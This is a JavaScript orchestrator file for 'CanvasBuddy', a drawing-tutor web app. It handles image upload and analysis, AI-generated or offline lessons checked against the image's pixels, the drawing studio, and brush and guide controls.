// app.js — CanvasBuddy orchestrator: start screen → analysis → lesson → studio → feedback → recap.
import { DrawingEngine } from './draw.js';
import { BRUSH_LIST, BRUSHES, renderBrushSample } from './brushes.js';
import { analyzeImage, modelCanvas, annotatedDataUrl, loadImageFromFile, loadImageFromSrc, renderBreakdown, buildPaintingLayers, toCanvas } from './palette.js';
import { auditLesson, repairLesson } from './audit.js';
import { sanitizeText, FLAG_HELP, scanImageBytes } from './guard.js';
import { buildLocalLesson, resolveGuide, ensureSketch, wantsConstruct } from './lesson.js';
import { renderStepGuides, guideSvgString, guidePng, ACTION_TEXT } from './guides.js';
import { Buddy, buddySvg, petals, happySpin } from './buddy.js';
import { Journey, buildRecap, MILESTONES } from './journey.js';
import { analyzeTelemetry, localCritique, valueNotesFrom, techniqueFor, TECHNIQUES, reaction } from './feedback.js';
import { makeMask, rasterizePrimitive, coverageReport } from './artist.js';
import { hexToRgb, rgbToLab, dilate } from './construct.js';

// null/false children (from conditional UI) must never turn into the text "null"
{ const rc = Element.prototype.replaceChildren; Element.prototype.replaceChildren = function (...k) { return rc.apply(this, k.flat().filter((x) => x != null && x !== false)); }; }
const $ = (id) => document.getElementById(id);
const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
const tick = () => new Promise((r) => requestAnimationFrame(() => setTimeout(r, 0)));

/** tiny DOM builder: text always goes through textContent */
function h(tag, attrs = {}, ...kids) {
  const e = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs || {})) {
    if (v === false || v == null) continue;
    if (k === 'class') e.className = v; else if (k === 'style') e.style.cssText = v; else if (k.startsWith('on')) e.addEventListener(k.slice(2), v); else if (k === 'dataset') Object.assign(e.dataset, v); else e.setAttribute(k, v === true ? '' : v);
  }
  for (const kid of kids.flat()) if (kid != null && kid !== false) e.append(kid.nodeType ? kid : document.createTextNode(String(kid)));
  return e;
}

/* ---------------------------------------------------------------- state */
const S = {
  opts: { mode: 'sketch', medium: 'Digital sketching', level: 'beginner', goalChips: new Set(), goalText: '', construct: true, precise: true },
  ref: null, analysis: null, lesson: null, stepIdx: 0, done: new Set(),
  ai: { hasKey: false, model: '' }, guideVisible: true, guideOpacity: 0.75, quiet: false, cmp: 0,
  sess: null, shown: [], recent: [], scrub: [], privGray: false, audit: null, receipts: [], clientFlags: [], lastBuddyAt: 0, strokesSinceReact: 0, firstStrokeSaid: false, selectedSwatch: -1, layersCache: null,
};
const journey = new Journey();
const engine = new DrawingEngine({ viewport: $('viewport'), stage: $('stage'), cursor: $('brushCursor') });
const buddy = new Buddy({ mount: $('buddyMount'), bubble: $('bubble'), log: $('buddyLog') });
window.__cb = { S, engine, journey }; // handy for demos/tests

/* ---------------------------------------------------------------- utilities */
let toastTimer;
function toast(msg, ms = 2600) { const t = $('toast'); t.textContent = msg; t.classList.add('show'); clearTimeout(toastTimer); toastTimer = setTimeout(() => t.classList.remove('show'), ms); }
async function api(path, body, timeoutMs = 45000) {
  const ctl = new AbortController(), t = setTimeout(() => ctl.abort(), timeoutMs);
  try {
    const r = await fetch(path, { method: body ? 'POST' : 'GET', headers: body ? { 'Content-Type': 'application/json' } : {}, body: body ? JSON.stringify(body) : undefined, signal: ctl.signal });
    return await r.json();
  } catch (e) { return { ok: false, reason: e.name === 'AbortError' ? 'timeout' : 'network', message: e.message }; } finally { clearTimeout(t); }
}
function show(id) { for (const s of ['start', 'loading']) $(s).hidden = s !== id; $('studio').hidden = id !== 'studio'; }
const step = () => S.lesson.steps[S.stepIdx];
function downloadBlob(blob, name) {
  const url = URL.createObjectURL(blob), a = h('a', { href: url, download: name }); document.body.append(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(url), 4000);
}
const canvasBlob = (c, type = 'image/png', q = 0.92) => new Promise((res) => c.toBlob(res, type, q));
function hexLum(hex) { const c = hexToRgb(hex) || [0, 0, 0]; return 0.299 * c[0] + 0.587 * c[1] + 0.114 * c[2]; }

/* ---------------------------------------------------------------- modal */
function openModal(...nodes) { $('modalBody').replaceChildren(...nodes); $('modalRoot').hidden = false; $('modal').scrollTop = 0; }
function closeModal() { $('modalRoot').hidden = true; $('modalBody').replaceChildren(); }
$('modalClose').onclick = closeModal; $('modalBack').onclick = closeModal;

/* ================================================================ START SCREEN */
$('heroBuddy').innerHTML = buddySvg(); $('loadBuddy').innerHTML = buddySvg();

async function refreshStatus() {
  const s = await api('/api/status', null, 4000);
  S.ai.hasKey = !!(s && s.hasKey); S.ai.model = (s && s.model) || '';
  const txt = S.ai.hasKey ? `AI on · ${S.ai.model.split('/').pop()}` : s && s.ok ? 'Offline demo mode · no API key' : 'Server not reachable';
  for (const id of ['aiBadge', 'aiBadge2']) { const b = $(id); b.textContent = txt; b.className = `badge ${S.ai.hasKey ? 'ok' : 'warn'}`; }
}
refreshStatus();

/** Peek at the raw uploaded file (before it is re-drawn, which drops all metadata) for hidden instructions. */
async function inspectUpload(file) {
  try {
    const r = scanImageBytes(new Uint8Array(await file.arrayBuffer())); S.uploadScan = { name: file.name, hits: r.hits };
    if (r.hits.length) { S.clientFlags.push('metadata_injection'); toast(`🛡️ Hidden instructions were found inside this image file (${r.hits.length}). They are ignored and removed before anything is sent.`, 7000); }
  } catch { S.uploadScan = null; }
}
function setRef(img, name, kind, type = null) {
  S.ref = { img, name, kind, sampleType: type };
  const c = $('refPreview'), w = img.naturalWidth || img.width, hh = img.naturalHeight || img.height, ctx = c.getContext('2d');
  c.width = 120; c.height = Math.max(40, Math.round(120 * hh / w)); ctx.fillStyle = '#fff'; ctx.fillRect(0, 0, c.width, c.height);
  ctx.imageSmoothingEnabled = Math.min(w, hh) > 128; ctx.drawImage(img, 0, 0, c.width, c.height);
  $('refName').textContent = name; $('refMeta').textContent = `${w}×${hh}px`; $('refChosen').hidden = false;
  $('startBtn').disabled = false; $('startHint').textContent = 'Ready when you are.';
  if (type === 'pixel_art') { $('mediumSel').value = 'Pixel art'; S.opts.medium = 'Pixel art'; }
}
$('fileInput').onchange = async (e) => {
  const f = e.target.files && e.target.files[0]; if (!f) return;
  try { await inspectUpload(f); const img = await loadImageFromFile(f); document.querySelectorAll('.sample').forEach((b) => b.classList.remove('on')); setRef(img, f.name.replace(/\.[^.]+$/, '').slice(0, 40) || 'My reference', 'upload'); }
  catch (err) { toast(err.message, 4000); }
  e.target.value = '';
};
const dz = $('dropzone');
['dragenter', 'dragover'].forEach((ev) => dz.addEventListener(ev, (e) => { e.preventDefault(); dz.classList.add('drag'); }));
['dragleave', 'drop'].forEach((ev) => dz.addEventListener(ev, (e) => { e.preventDefault(); dz.classList.remove('drag'); }));
dz.addEventListener('drop', async (e) => { const f = e.dataTransfer.files[0]; if (!f) return; try { await inspectUpload(f); setRef(await loadImageFromFile(f), f.name.replace(/\.[^.]+$/, ''), 'upload'); } catch (err) { toast(err.message, 4000); } });
document.querySelectorAll('.sample').forEach((b) => (b.onclick = async () => {
  document.querySelectorAll('.sample').forEach((x) => x.classList.toggle('on', x === b));
  try { setRef(await loadImageFromSrc(b.dataset.sample), b.dataset.name, 'sample', b.dataset.type); } catch (err) { toast(err.message); }
}));
function segment(id, attr, key) {
  $(id).querySelectorAll('button').forEach((b) => (b.onclick = () => { $(id).querySelectorAll('button').forEach((x) => x.classList.toggle('on', x === b)); S.opts[key] = b.dataset[attr]; syncOptUi(); }));
}
function syncOptUi() { // shapes-first only makes sense when you are sketching
  const on = wantsConstruct(S.opts.mode, true), cb = $('optConstruct');
  cb.disabled = !on; cb.closest('label').style.opacity = on ? '' : '0.45';
  cb.closest('label').title = on ? '' : 'Shapes-first is used in Sketch and Sketch → Paint modes';
}
segment('modeSeg', 'mode', 'mode'); segment('levelSeg', 'level', 'level');
$('mediumSel').onchange = (e) => (S.opts.medium = e.target.value);
$('goalChips').querySelectorAll('button').forEach((b) => (b.onclick = () => { b.classList.toggle('on'); b.classList.contains('on') ? S.opts.goalChips.add(b.textContent) : S.opts.goalChips.delete(b.textContent); }));
$('optConstruct').onchange = (e) => (S.opts.construct = e.target.checked);
$('optPrecise').onchange = (e) => (S.opts.precise = e.target.checked);
syncOptUi();
$('goalInput').oninput = (e) => (S.opts.goalText = e.target.value.slice(0, 140));
$('btnJourneyStart').onclick = () => showJourney();
$('startBtn').onclick = () => startProject();

/* ================================================================ PROJECT START */
function goalString() { return [...S.opts.goalChips, S.opts.goalText.trim()].filter(Boolean).join('; '); }
function trimHints(sum, srcSize) {
  const r2 = (v) => +v.toFixed(2);
  return {
    source_size: srcSize, palette: sum.palette, stats: sum.stats,
    subject: { bbox: sum.subject.bbox, centroid: sum.subject.centroid, focal: sum.subject.focal, ellipses: sum.subject.ellipses.map((e) => ({ center: e.center.map(r2), radius: e.radius.map(r2), rotation: Math.round(e.rotation) })) },
    measured_forms: sum.subject.formsApprox ? [] : (sum.subject.forms || []).slice(0, 8), line_of_action: sum.subject.formsApprox ? null : sum.subject.axis || null,
    value_fractions_3: sum.masses.valueFractions3,
    regions: (sum.regions || []).map((r) => ({ id: r.id, tone: r.tone, area: r.area, bbox: r.bbox })),
  };
}

/** The exact pixels sent to the AI: re-rasterised (EXIF dropped), optionally scrubbed / grayscale. */
const aiCanvas = (maxSide = 768) => modelCanvas(S.ref.img, { maxSide, scrub: S.scrub, gray: S.privGray });
const aiJpeg = (maxSide = 768, q = 0.82) => aiCanvas(maxSide).toDataURL('image/jpeg', q);
function noteSecurity(res) {
  if (!res || !res.security) return; const sec = res.security;
  S.receipts.unshift({ at: Date.now(), ...sec.receipt, flags: sec.flags }); S.receipts.length = Math.min(S.receipts.length, 12);
  if (sec.flags && sec.flags.length) { const f = sec.flags.find((x) => FLAG_HELP[x]); toast(`🛡️ Guardrail: ${FLAG_HELP[f] || 'content was sanitised'}`, 4500); }
}
async function requestAiLesson(sum, analysis, feedback = []) {
  const o = S.opts, clean = sanitizeText(goalString(), { max: 160 });
  if (clean.flags.length) { S.clientFlags.push(...clean.flags); toast(`🛡️ Guardrail: ${FLAG_HELP[clean.flags[0]] || 'text sanitised'}`, 4500); }
  const cv = aiCanvas(768);
  const payload = { image: cv.toDataURL('image/jpeg', 0.82), image2: annotatedDataUrl(cv, sum.regions || []), mode: o.mode, medium: o.medium, level: o.level, build_up: { construct: wantsConstruct(o.mode, o.construct), precise: !!o.precise }, goal: clean.text, hints: trimHints(sum, analysis.sourceSize), audit_feedback: feedback };
  const r = await api('/api/analyze', payload, 90000); noteSecurity(r); return r;
}

async function startProject() {
  if (!S.ref) return;
  const needsAi = S.ai.hasKey && S.opts.mode !== 'free';
  show('loading'); $('skipAi').hidden = true;
  const steps = ['Measuring shapes, values and colors', needsAi ? 'Asking the AI to plan your lesson' : 'Building your starter lesson', 'Checking every marker against your image', 'Preparing your canvas'];
  const ul = $('loadSteps'); ul.replaceChildren(...steps.map((t, i) => h('li', { class: i === 0 ? 'cur' : '' }, t)));
  const mark = (i, cls) => { ul.children[i].className = cls; if (ul.children[i + 1]) ul.children[i + 1].className = 'cur'; };
  $('loadTitle').textContent = 'Looking at your reference…'; await tick();

  const analysis = analyzeImage(S.ref.img); mark(0, 'done'); await tick();
  const sum = analysis.summary, type = S.ref.sampleType || sum.stats.guessedType;
  if (S.ref.sampleType) sum.stats.guessedType = S.ref.sampleType === 'line_art' ? 'line_art' : sum.stats.guessedType;
  const o = S.opts; let lesson = null, why = '';

  if (needsAi) {
    $('loadTitle').textContent = 'Buddy is studying the composition…'; $('skipAi').hidden = false; $('loadBuddy').firstElementChild.dataset.mood = 'think';
    let skip; const skipP = new Promise((r) => (skip = r)); $('skipAi').onclick = () => skip({ ok: false, reason: 'skipped' });
    const r = await Promise.race([requestAiLesson(sum, analysis), skipP]);
    if (r && r.ok && r.lesson) { lesson = r.lesson; lesson.source = 'ai'; journey.noteAnalysis(); } else why = (r && (r.message || r.reason)) || 'unknown';
    $('skipAi').hidden = true; mark(1, lesson ? 'done' : 'skip');
  } else { if (!S.ai.hasKey) why = 'no_key'; mark(1, 'done'); }

  const localLesson = () => buildLocalLesson({ mode: o.mode, imageType: type, medium: o.medium, level: o.level, goal: goalString(), summary: sum, construct: o.construct, precise: o.precise });
  if (!lesson) {
    lesson = localLesson();
    if (needsAi) toast(`AI lesson unavailable (${String(why).slice(0, 60)}). Using the offline lesson.`, 5000);
    if (!needsAi) journey.noteAnalysis();
  }

  const withSketch = (l) => ensureSketch(l, sum, { mode: o.mode, construct: wantsConstruct(o.mode, o.construct), precise: o.precise }).lesson;
  lesson = withSketch(lesson); // a sketch is (almost) always established first: if the tutor skipped it, add the measured outline step
  // ---- Audit Agent: verify the tutor's markers against the picture's own pixels ----
  $('loadTitle').textContent = 'Verifying the lesson against your image…'; await tick();
  let audit = auditLesson(lesson, sum, analysis.maps);
  const rep = repairLesson(lesson, sum, audit); if (rep.repaired) { lesson = rep.lesson; audit = auditLesson(lesson, sum, analysis.maps); }
  if (lesson.source === 'ai' && audit.verified < Math.ceil(lesson.steps.length / 2)) { // too many unverified steps: one clean regeneration with the auditor's findings
    $('loadTitle').textContent = 'Some markers looked misplaced — asking for a corrected lesson…';
    const r2 = await requestAiLesson(sum, analysis, audit.feedback);
    if (r2 && r2.ok && r2.lesson) {
      let l2 = withSketch(r2.lesson); l2.source = 'ai'; let a2 = auditLesson(l2, sum, analysis.maps); const rp = repairLesson(l2, sum, a2); if (rp.repaired) { l2 = rp.lesson; a2 = auditLesson(l2, sum, analysis.maps); }
      if (a2.overall > audit.overall) { lesson = l2; audit = a2; }
    }
    if (audit.overall < 0.35) { lesson = withSketch(localLesson()); audit = auditLesson(lesson, sum, analysis.maps); toast('The AI lesson could not be verified against your image, so a safer measured lesson is used instead.', 6000); }
  }
  mark(2, 'done');
  // pixel-derived palette is more reliable than model-estimated hex values
  lesson.palette = sum.palette.map((p) => ({ hex: p.hex.toUpperCase(), role: p.role, fraction_estimate: p.fraction }));
  if (o.mode === 'free') lesson.steps.forEach((s) => (s.guides = []));
  S.analysis = analysis; S.lesson = lesson; S.audit = audit; S.stepIdx = 0; S.done = new Set(); S.shown = []; S.layersCache = null;
  try { localStorage.setItem('cb.lastLesson', JSON.stringify({ at: Date.now(), ref: S.ref.name, lesson, audit })); } catch { /* storage may be full */ }
  await tick(); mark(3, 'done');
  enterStudio();
}

/* ================================================================ STUDIO SETUP */
function enterStudio() {
  show('studio');
  const img = S.ref.img, sw = img.naturalWidth || img.width, sh = img.naturalHeight || img.height;
  const long = 1280, sc = long / Math.max(sw, sh); let w = Math.round(sw * sc), hh = Math.round(sh * sc);
  const isPixel = S.lesson.strategy === 'pixel' || /pixel/i.test(S.opts.medium);
  if (isPixel) { w = Math.max(40, Math.round(w / 40) * 40); hh = Math.max(40, Math.round(hh / 40) * 40); }
  engine.init(w, hh);
  engine.setReference(toCanvas(img, Math.max(w, hh))); engine.setGhost('off'); S.cmp = 0; $('cmpLabel').textContent = 'off';
  engine.flipReset?.(); engine.setFlip(false);
  if (isPixel) engine.sizes.pixel = Math.round(Math.max(w, hh) / 32);
  setupGuideLayer();
  if (S.opts.mode !== 'free') { engine.layers[0].name = 'Scaffold sketch'; engine.setLayerOpacity(0, 0.85); engine.addLayer('Art'); engine.selectLayer(0); S.scaffoldToldAt = -1; }
  $('projTitle').textContent = `${S.ref.name} · ${S.opts.mode === 'free' ? 'free practice' : S.opts.mode === 'sketch_paint' ? 'sketch → paint' : S.opts.mode}`;
  renderLeft(); renderPalette(); renderLayers(); buildBrushRow(); S.layersCache = null;
  S.sess = { id: `s${Date.now().toString(36)}`, startAt: Date.now(), lastAct: Date.now(), activeMs: 0, stepsDone: [], guideSteps: 0, coverage: [], checks: 0, viewed: new Set(), pencil: false, touch: false };
  $('buddyLog').replaceChildren(); $('critiqueCard').hidden = true; $('coachCard').hidden = true;
  S.firstStrokeSaid = false; S.strokesSinceReact = 0; S.lastBuddyAt = 0;
  goStep(0, { silent: true });
  requestAnimationFrame(() => { engine._rect = null; engine.fit(); });
  buddy.say(S.lesson.buddy_intro || 'Let’s start with the big shapes before worrying about details. You’re the artist — I just point!', 'info', { mood: 'cheer' });
  if (S.lesson.source === 'local') $('sourceChip').textContent = 'offline lesson'; else $('sourceChip').textContent = 'AI lesson';
  updateHistoryButtons();
}

function setupGuideLayer() {
  const svg = $('guides'); svg.setAttribute('viewBox', `0 0 ${engine.doc.w} ${engine.doc.h}`); svg.style.opacity = S.guideOpacity;
  svg.style.display = S.guideVisible ? '' : 'none';
}

/* ---------- left panel ---------- */
function renderLeft() {
  const L = S.lesson, a = L.analysis;
  $('strategyChip').textContent = (L.strategy || 'lesson').replace(/_/g, ' ');
  $('lessonGoal').textContent = L.learning_goal;
  $('lessonSummary').textContent = a.summary || `This looks like ${a.image_type.replace(/_/g, ' ')}. Let’s break it into steps.`;
  const notes = []; if (a.uncertainties && a.uncertainties.length) notes.push(`Buddy isn’t sure about: ${a.uncertainties.join('; ')}.`);
  if (L.composition.notes) notes.push(L.composition.notes);
  notes.push(`Image type: ${a.image_type.replace(/_/g, ' ')} · complexity: ${a.complexity} · confidence ${Math.round(a.confidence * 100)}%`);
  $('compNotes').replaceChildren(...notes.map((n) => h('p', { class: 'fine' }, n)));
  showBreakdown('original', false);
  document.querySelectorAll('#refTabs button').forEach((b) => b.classList.toggle('on', b.dataset.view === 'original'));
  renderStepList();
}
function showBreakdown(kind, track = true) {
  const src = renderBreakdown(S.analysis.maps, kind), c = $('refView');
  c.width = src.width; c.height = src.height; const ctx = c.getContext('2d'); ctx.imageSmoothingEnabled = !(Math.min(...S.analysis.sourceSize) <= 128 && kind === 'original'); ctx.drawImage(src, 0, 0);
  if (track && kind !== 'original' && S.sess) S.sess.viewed.add(kind);
  const hints = { original: 'The reference stays here so your canvas stays clear.', value3: 'Three values: if these shapes are right, the picture already reads.', value5: 'Five values: where the finer tonal steps live.', edges: 'Where the strongest edges are — your last step, not your first.', masses: 'Big color masses: block these in before any detail.' };
  $('refHint').textContent = hints[kind];
}
document.querySelectorAll('#refTabs button').forEach((b) => (b.onclick = () => { document.querySelectorAll('#refTabs button').forEach((x) => x.classList.toggle('on', x === b)); showBreakdown(b.dataset.view); }));
function auditIcon(i) { const a = S.audit && S.audit.steps[i]; return !a || S.opts.mode === 'free' ? '' : a.status === 'verified' ? '🛡️' : a.status === 'weak' ? '⚠️' : '❓'; }
function renderStepList() {
  const ol = $('stepList'); ol.replaceChildren();
  S.lesson.steps.forEach((s, i) => {
    const li = h('li', { class: `${i === S.stepIdx ? 'cur' : ''} ${S.done.has(i) ? 'done' : ''}`, style: `animation-delay:${i * 60}ms` },
      h('button', { onclick: () => { goStep(i); closeDrawers(); } }, h('span', { class: 'n' }, S.done.has(i) ? '✓' : i + 1), h('span', {}, h('b', {}, s.title), h('small', {}, s.phase.replace(/_/g, ' '))), h('span', { class: 'aud', title: 'Audit status' }, auditIcon(i))));
    ol.append(li);
  });
  $('progressBar').style.width = `${(S.done.size / S.lesson.steps.length) * 100}%`;
}

/* ---------- steps ---------- */
function goStep(i, { silent = false } = {}) {
  S.stepIdx = clamp(i, 0, S.lesson.steps.length - 1); const st = step();
  $('scNo').textContent = `Step ${S.stepIdx + 1}/${S.lesson.steps.length}`; $('scTitle').textContent = st.title;
  $('scText').textContent = st.instruction; $('scWhy').textContent = st.why ? `Why: ${st.why}` : '';
  $('stepLabel').textContent = `${S.stepIdx + 1}/${S.lesson.steps.length}`;
  $('btnPrev').disabled = S.stepIdx === 0; $('btnNext').disabled = S.stepIdx >= S.lesson.steps.length - 1;
  $('scDone').textContent = S.stepIdx === S.lesson.steps.length - 1 ? 'Finish ✓' : 'Done ✓';
  $('stepCard').classList.remove('min'); $('stepCard').style.animation = 'none'; void $('stepCard').offsetWidth; $('stepCard').style.animation = '';
  const br = BRUSHES[st.brush] || BRUSHES.pencil;
  $('scBrush').textContent = `${br.icon} ${br.name}`; $('scBrush').onclick = () => applyStepBrush();
  renderStepList(); drawGuides(); selectStepLayer(st, silent); renderTargets(); renderAuditBadge();
  if (!silent) applyStepBrush(true); else applyStepBrush(true);
  if (!silent && st.tip) buddy.say(st.tip, 'tip', { mood: 'think' });
}
function selectStepLayer(st, silent) {
  if (S.opts.mode === 'free' || engine.layers.length < 2) return;
  const want = st.layer === 'scaffold' ? 0 : engine.layers.findIndex((l) => l.name === 'Art');
  if (want >= 0 && engine.active !== want) {
    engine.selectLayer(want);
    if (!silent && st.layer !== 'scaffold' && S.scaffoldToldAt !== 1) { S.scaffoldToldAt = 1; toast('Switched to the Art layer. Your rough scaffold lines stay on their own layer — hide it with 👁️ in Layers any time.', 5200); }
  }
}
function stepPrims(st = step()) { try { return (st.guides || []).flatMap((g) => resolveGuide(g, S.analysis.summary)); } catch { return []; } }
function renderTargets() {
  const ol = $('scTargets'), all = stepPrims(), seenForm = new Set(), solids = all.filter((p) => p.construct && !seenForm.has(p.form) && seenForm.add(p.form)), art = all.filter((p) => p.kind === 'strokes'), ts = [...solids, ...art, ...all.filter((p) => p.role)];
  const prog = S.prog || {};
  ol.replaceChildren(...ts.map((p, i) => { const pr = prog[`${S.stepIdx}:${p.label}`]; return h('li', { class: pr && pr.pct >= 70 ? 'ok' : '' }, h('i', { class: 'ico' }, p.kind === 'strokes' ? '✏️' : p.construct ? ({ sphere: '◯', box: '▭', cylinder: '▯', axis: '⤢' }[p.shape] || '◇') : p.role === 'shade' ? (p.action === 'lift' ? '✦' : p.action === 'blend_edges' ? '≈' : '▨') : p.outline || p.sketch ? '✏️' : '◯'), h('span', {}, p.label, ' ', h('small', {}, p.kind === 'strokes' ? `· ${p.paths.length} line${p.paths.length === 1 ? '' : 's'} — what is left when you remove the colour` : p.construct ? `· ${{ sphere: 'sphere: circle + curved equator', box: 'box: front + back face', cylinder: 'cylinder: two ovals + sides', axis: 'one flowing line through the pose' }[p.shape] || ''}` : p.role === 'shade' ? `· ${ACTION_TEXT(p)}` : p.note ? `· ${p.note}` : ''), pr && typeof pr.pct === 'number' ? h('small', {}, ` · ${pr.pct}%`) : null)); }));
}
function renderAuditBadge() {
  const el = $('scAudit'), a = S.audit && S.audit.steps[S.stepIdx]; if (!a || S.opts.mode === 'free') { el.hidden = true; return; }
  el.hidden = false; el.className = `sc-audit ${a.status === 'verified' ? 'good' : ''}`;
  el.textContent = a.status === 'verified' ? '🛡️ Verified: the markers match what is in the picture.' : `⚠️ ${a.status === 'weak' ? 'Partly verified' : 'Unverified placement'} — treat these markers as a rough guide.${a.issues[0] ? ` (${a.issues[0]})` : a.targets.find((t) => !t.ok) ? ` (${a.targets.find((t) => !t.ok).label}: ${a.targets.find((t) => !t.ok).detail})` : ''}`;
}
function applyStepBrush(quiet = false) {
  const st = step(), br = BRUSHES[st.brush] || BRUSHES.pencil;
  engine.setBrush(br.id);
  const mult = { large: 1.8, medium: 1, small: 0.6 }[st.size_hint];
  if (mult && br.kind !== 'pixel') engine.sizes[br.id] = clamp(br.size[2] * mult, br.size[0], br.size[1]);
  syncDock(); if (!quiet) toast(`${br.icon} ${br.name} — ${br.desc}`);
}
function drawGuides(animate = true) {
  const svg = $('guides');
  if (S.opts.mode === 'free') { svg.replaceChildren(); return; }
  renderStepGuides(svg, step(), S.analysis.summary, S.analysis.maps, engine.doc, { animate });
}
$('btnPrev').onclick = () => goStep(S.stepIdx - 1);
$('btnNext').onclick = () => goStep(S.stepIdx + 1);
$('scMin').onclick = () => $('stepCard').classList.toggle('min');
$('scDone').onclick = () => markDone();
$('btnGuides').onclick = () => setGuideVisible(!S.guideVisible);
$('guideOpacity').oninput = (e) => { S.guideOpacity = e.target.value / 100; $('guides').style.opacity = S.guideOpacity; };
function setGuideVisible(v) {
  S.guideVisible = v; $('btnGuides').classList.toggle('on', v); $('guides').style.display = v ? '' : 'none';
  if (v) drawGuides(true);
}

function markDone() {
  const i = S.stepIdx, st = step(); if (S.done.has(i)) { if (i < S.lesson.steps.length - 1) goStep(i + 1); else finishProject(); return; }
  S.done.add(i);
  S.sess.stepsDone.push({ id: st.id, title: st.title, phase: st.phase, technique: st.technique || null });
  if (S.guideVisible && st.guides.length) S.sess.guideSteps++;
  petals($('petals'), 18); buddy.say(reaction('stepDone'), 'positive', { mood: 'cheer' });
  renderStepList();
  if (S.done.size >= S.lesson.steps.length) { buddy.say('That’s the whole lesson! Tap Finish to see your recap, or keep going on your own.', 'positive'); $('btnFinish').style.animation = 'rise .5s both'; if (i === S.lesson.steps.length - 1) { setTimeout(() => { if ($('modalRoot').hidden) finishProject(); }, 900); } }
  else if (i < S.lesson.steps.length - 1) setTimeout(() => goStep(i + 1), 500);
}

/* ================================================================ DOCK */
function buildBrushRow() {
  const row = $('brushRow'); row.replaceChildren();
  for (const b of BRUSH_LIST) row.append(h('button', { class: 'brush-chip', dataset: { id: b.id }, title: b.desc, onclick: () => { engine.setBrush(b.id); syncDock(); } }, h('span', { class: 'ic' }, b.icon), b.name));
}
const sizeToSlider = (br, v) => (Math.log(v / br.size[0]) / Math.log(br.size[1] / br.size[0])) * 100;
const sliderToSize = (br, p) => br.size[0] * Math.pow(br.size[1] / br.size[0], p / 100);
function syncDock() {
  const br = BRUSHES[engine.brushId], size = engine.sizeFor(br);
  document.querySelectorAll('.brush-chip').forEach((c) => c.classList.toggle('on', c.dataset.id === br.id));
  const on = document.querySelector('.brush-chip.on'); if (on) on.scrollIntoView({ block: 'nearest', inline: 'center', behavior: 'smooth' });
  $('sizeRange').value = sizeToSlider(br, size); $('sizeVal').textContent = br.kind === 'pixel' ? `${Math.round(size)}px cells` : `${Math.round(size)}px`;
  $('opacityRange').value = Math.round(engine.opacity * 100); $('colorInput').value = engine.color.toLowerCase();
  renderBrushSample($('brushPreview'), br.id, engine.color, Math.min(size, 40), engine.opacity); engine._updateCursor();
}
$('sizeRange').oninput = (e) => { const br = BRUSHES[engine.brushId]; engine.setSize(sliderToSize(br, +e.target.value)); syncDock(); };
$('opacityRange').oninput = (e) => { engine.setOpacity(e.target.value / 100); renderBrushSample($('brushPreview'), engine.brushId, engine.color, Math.min(engine.sizeFor(), 40), engine.opacity); };
$('colorInput').oninput = (e) => { engine.setColor(e.target.value); syncDock(); };
$('colorInput').onchange = (e) => addRecent(e.target.value);
function addRecent(hex) {
  hex = hex.toLowerCase(); S.recent = [hex, ...S.recent.filter((c) => c !== hex)].slice(0, 8);
  $('recentColors').replaceChildren(...S.recent.map((c) => h('button', { style: `background:${c}`, 'aria-label': c, onclick: () => { engine.setColor(c); syncDock(); } })));
}
engine.on('brush', syncDock).on('color', syncDock).on('toast', (m) => toast(m));
engine.on('picked', (hex) => { addRecent(hex); engine.setTool('brush'); toast(`Picked ${hex}`); });
engine.on('history', updateHistoryButtons);
function updateHistoryButtons() { const s = engine.historyState(); $('btnUndo').disabled = !s.canUndo; $('btnRedo').disabled = !s.canRedo; }
$('btnUndo').onclick = () => engine.undo(); $('btnRedo').onclick = () => engine.redo();
$('btnPicker').onclick = () => { const on = engine.tool !== 'picker'; engine.setTool(on ? 'picker' : 'brush'); if (on) toast('Tap the canvas to pick a color'); };
$('btnFill').onclick = () => { const on = engine.tool !== 'fill'; engine.setTool(on ? 'fill' : 'brush'); if (on) toast('Fill: tap inside a closed outline. Tip: fill goes on the active layer, under your lines.', 4200); };
engine.on('tool', (t) => { $('btnPicker').classList.toggle('on', t === 'picker'); $('btnFill').classList.toggle('on', t === 'fill'); });
$('fillGap').oninput = (e) => (engine.fillGap = +e.target.value); $('fillTol').oninput = (e) => (engine.fillTol = +e.target.value);
$('btnFlip').onclick = () => { engine.setFlip(engine.view.flip === 1); $('btnFlip').classList.toggle('on', engine.view.flip === -1); if (engine.view.flip === -1) buddy.say('Flipped! Mistakes in proportion pop out in a mirror. Tap again to flip back.', 'tip'); };
$('btnCompare').onclick = () => {
  S.cmp = (S.cmp + 1) % 3; const modes = ['off', 'ghost', 'difference'];
  engine.setGhost(modes[S.cmp], 0.35); $('cmpLabel').textContent = S.cmp === 0 ? 'off' : S.cmp === 1 ? 'ghost' : 'diff'; $('btnCompare').classList.toggle('on', S.cmp > 0);
  if (S.cmp === 2) toast('Difference view: dark = matches the reference, bright = differs');
};
$('btnFinger').onclick = () => { engine.setFingerDraws(!engine.fingerDraws); };
engine.on('fingermode', (v) => { $('fingerLabel').textContent = v ? 'draws' : 'moves'; $('btnFinger').classList.toggle('on', !v); });
$('zoomIn').onclick = () => engine.zoomAt(1.3); $('zoomOut').onclick = () => engine.zoomAt(1 / 1.3); $('zoomFit').onclick = () => engine.fit();
engine.on('view', (v) => { $('stage').style.setProperty('--gw', (2.6 / v.z).toFixed(2)); });
engine.on('pencil', () => {
  if (S.sess) S.sess.pencil = true;
  engine.setFingerDraws(false); toast('Apple Pencil detected ✏️ — fingers now pan & zoom (change in the ☝️ button)', 4500);
  buddy.say('Pencil detected! Draw with the Pencil, and use two fingers to move around. Two-finger tap = undo.', 'tip');
});
engine.on('gesturetap', (n) => toast(n === 2 ? 'Undo' : 'Redo', 900));
let touchSeen = false;
$('viewport').addEventListener('pointerdown', (e) => { if (e.pointerType === 'touch' && !touchSeen) { touchSeen = true; $('gestureHint').hidden = false; setTimeout(() => ($('gestureHint').hidden = true), 6000); } }, { passive: true });

/* ---------- activity & automatic reactions ---------- */
engine.on('stroke', ({ metrics }) => {
  if (!S.sess) return; const now = Date.now(); const gap = now - S.sess.lastAct; if (gap < 60000) S.sess.activeMs += gap; S.sess.lastAct = now;
  addRecent(engine.color); S.strokesSinceReact++; if (!$('stepCard').classList.contains('min')) $('stepCard').classList.add('min'); // get out of the way once drawing starts
  if (S.quiet) return;
  if (!S.firstStrokeSaid) { S.firstStrokeSaid = true; buddy.say('Nice first mark! Keep it light and loose for now.', 'positive'); S.lastBuddyAt = now; S.strokesSinceReact = 0; return; }
